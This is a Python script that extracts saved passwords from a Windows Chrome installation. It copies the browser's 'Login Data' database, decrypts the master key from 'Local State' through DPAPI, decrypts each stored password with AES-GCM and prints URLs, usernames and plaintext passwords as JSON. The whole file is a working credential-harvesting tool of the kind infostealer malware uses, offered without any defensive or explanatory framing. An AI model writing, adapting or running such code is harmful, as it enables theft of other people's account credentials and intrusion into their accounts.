import json
import os
import platform
import sqlite3
import string
import subprocess
import base64
from Crypto.Cipher import AES
from getpass import getuser
from importlib import import_module
from os import unlink
from shutil import copy



class ChromeWin:
    """ Decryption class for chrome windows installation """
    def __init__(self):
        """ Windows Initialization Function """
        # search the genral chrome version path
        win_path = f"C:\\Users\\{getuser()}\\AppData\\Local\\Google" "\\{chrome}\\User Data\\Default\\"
        win_chrome_ver = [
            item for item in
            ['chrome', 'chrome dev', 'chrome beta', 'chrome canary']
            if os.path.exists(win_path.format(chrome=item))
        ]
        self.dbpath = win_path.format(chrome=''.join(win_chrome_ver))
        # self.dbpath = (f"C:\\Users\\{getuser()}\\AppData\\Local\\Google"
        #                "\\Chrome\\User Data\\Default\\")

    def decrypt_func(self, enc_passwd):
        """ Windows Decryption Function """
        with open(f"C:\\Users\\{getuser()}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", "r", encoding="utf-8") as f:
            try:
                master_key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])
                master_key = master_key[5:]  # removing DPAPI
                #print(master_key)
            except Exception:
                master_key = None
            iv = enc_passwd[3:15]
            payload = enc_passwd[15:]
            win32crypt = import_module('win32crypt')
            data = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            cipher = AES.new(data, AES.MODE_GCM, iv)
            decrypted_value = str(cipher.decrypt(payload)[:-16], "utf-8", "ignore")
            #print(decrypted_value)
            return decrypted_value


class Chrome:
    """ Generic OS independent Chrome class """
    def __init__(self):
        """ determine which platform you are on """
        target_os = platform.system()
        if target_os == 'Windows':
            self.chrome_os = ChromeWin()
    @property
    def get_login_db(self):
        """ getting "Login Data" sqlite database path """
        return self.chrome_os.dbpath

    def get_password(self, prettyprint=False):
        """ get URL, username and password in clear text
            :param prettyprint: if true, print clear text password to screen
            :return: clear text data in dictionary format
        """
        copy(self.chrome_os.dbpath + "Login Data", "Login Data.db")
        conn = sqlite3.connect("Login Data.db")
        cursor = conn.cursor()
        cursor.execute("""
            SELECT action_url, username_value, password_value
            FROM logins; """)
        data = {'data': []}
        for result in cursor.fetchall():
            _passwd = self.chrome_os.decrypt_func(result[2])
            passwd = ''.join(i for i in _passwd if i in string.printable)
            if result[1] or passwd:
                _data = {}
                _data['url'] = result[0]
                _data['username'] = result[1]
                _data['password'] = _passwd
                data['data'].append(_data)
        conn.close()
        unlink("Login Data.db")

        if prettyprint:
            return json.dumps(data, indent=4)
        return data




def main():
    """ Operational Script """
    chrome_pwd = Chrome()
    print(chrome_pwd.get_login_db)
    print(chrome_pwd.get_password(prettyprint=True))


if __name__ == '__main__':
    main()